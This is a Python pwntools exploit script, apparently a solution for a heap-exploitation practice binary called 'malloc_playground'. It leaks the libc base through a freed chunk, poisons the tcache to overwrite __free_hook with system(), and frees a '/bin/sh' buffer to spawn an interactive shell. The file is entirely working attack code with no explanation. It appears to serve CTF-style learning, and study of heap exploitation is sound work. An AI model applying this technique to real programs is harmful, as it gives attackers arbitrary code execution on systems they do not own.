#!/usr/bin/env python3
from pwn import *
from sys import argv
context(arch='amd64',os='linux',log_level='DEBUG')
binary=ELF("./malloc_playground",checksec=False)
if len(argv)>1 and argv[1]=="-r":
    arena_offset=0x3ebc40+96
    libc=ELF("./libc.so.6",checksec=False)
    p=remote("localhost",9999)
else:
    arena_offset=0x1c0a00+96
    libc=ELF("/usr/lib/libc.so.6",checksec=False)
    p=binary.process()
s=lambda x,r="":p.sendlineafter(r,x)if r else p.sendline(x)
malloc=lambda sz,quan:s(f"malloc {sz} {quan}",">")
free=lambda idx:s(f"free {idx}",">")
freeall=lambda:s("freeall",">")
edit=lambda idx,sz,data:(s(f"edit {idx} {sz}",">"),s(data,"to write:"))
read=lambda idx,sz:s(f"read {idx} {sz}",">")

chunk_sz=[32+(i*16)-8 for i in range(64)]
tcache_idx=[i+8 for i in chunk_sz]

# leak
malloc(24,1)
malloc(1040,1)
malloc(24,2)
## prevent consolidate
free(3) # 24
free(1) # 1040
free(2) # 24
read(0,chunk_sz[0]+16)
base=int.from_bytes(p.recvline().strip(b"\n")[-8:],"little") -arena_offset
system=libc.symbols['system']+base
hook=libc.symbols['__free_hook']+base
log.info("Leaked base address of libc: %s"%hex(base))

## poison tcache to overwrite malloc
malloc(72,2)
free(2)
edit(1,72+16+8,b"A"*72+p64(51)+p64(hook)+p64(hook))
s("\n")
malloc(72,2)
edit(3,9,p64(system))
s(p64(system))
malloc(100,1)
edit(4,9,b"/bin/sh")
free(4)
context.log_level='warning'
p.interactive()
